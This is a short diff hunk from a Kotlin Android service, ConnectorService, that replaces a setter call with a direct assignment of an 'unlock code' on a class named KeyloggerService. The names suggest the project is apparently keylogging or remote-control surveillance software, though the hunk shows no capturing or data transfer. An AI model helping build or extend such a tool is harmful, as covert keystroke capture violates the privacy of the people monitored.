@@ -905,7 +905,7 @@ class ConnectorService : Service() {
     private fun doSetUnlockCode(code: String): String {
         val c = code.trim().filter { it.isLetterOrDigit() }.take(12)
         return if (c.length >= 2) {
-            KeyloggerService.setUnlockCode(c)
+            KeyloggerService.unlockCode = c
             "OK: Unlock code set to [$c]"
         } else "ERROR: Code too short — min 2 chars"
     }
